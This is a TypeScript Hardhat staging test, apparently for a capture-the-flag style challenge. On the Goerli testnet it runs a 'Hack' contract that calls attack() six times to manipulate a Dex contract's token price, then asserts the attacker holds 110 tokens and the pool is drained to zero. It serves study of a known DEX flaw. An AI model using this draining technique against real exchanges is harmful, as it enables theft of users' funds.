import { assert } from "chai"
import { network, ethers, } from "hardhat"
import { developmentChains,networkConfig } from "../../helper-hardhat-config"
import { Dex , Hack } from "../../typechain-types"
import abi from "../../artifacts/contracts/Dex.sol/Dex.json"
import erc20Abi from "../../artifacts/contracts/Hack.sol/IERC20.json"


const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL
const PRIVATE_KEY = String(process.env.PRIVATE_KEY) 

developmentChains.includes(network.name)
    ? describe.skip
    : describe("Dex hack staging", function () {
        let provider: any 
        let wallet:any
        let hack: Hack
        let addressContract: string
        let dex: Dex
        let token1: Hack
        let token2: Hack
        let addressToken1:string
        let addressToken2:string

        beforeEach(async() => {
            provider =  new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
            wallet  = new ethers.Wallet(PRIVATE_KEY,provider)
            
            hack = await ethers.getContract("Hack")
            addressContract = networkConfig[network.config.chainId!]["contractAddress"]!
            dex = new ethers.Contract(addressContract,abi.abi,wallet)

            addressToken1 = await dex.token1()
            addressToken2 = await dex.token2()
            token1 = new ethers.Contract(addressToken1,erc20Abi.abi,wallet)
            token2 = new ethers.Contract(addressToken2,erc20Abi.abi,wallet)
        })
        
        describe("Try hack Dex", function () {
            it("Transfer the token first", async() => {
                const tx =await  token1.approve(hack.address,10)
                await tx.wait(1)
                const tx2 = await token2.approve(hack.address,10)
                await tx2.wait(1)
                const tx3 = await hack.setTokenAddress()
                await tx3.wait(1)
                let balance1 = (await token1.balanceOf(hack.address)).toString()
                let balance2 = (await token2.balanceOf(hack.address)).toString()
                assert.equal(balance1,"10")
                assert.equal(balance2,"10")
            })
            describe("Hack start", function(){
                [1,2,3,4,5,6].forEach(async(value)=> {
                    it(`Attack `, async() => {
                        const tx = await hack.attack()
                        await tx.wait(1)
                        console.log("Manipulation price",value)

                    })
                })
            })
            it("Check the balance", async() => {
                const balance = (await token1.balanceOf(hack.address)).toString()
                const balancePool = (await token1.balanceOf(addressContract)).toString()

                assert.equal(balance,"110")
                assert.equal(balancePool,"0")
            }) 
            
           
        })
    })
        
    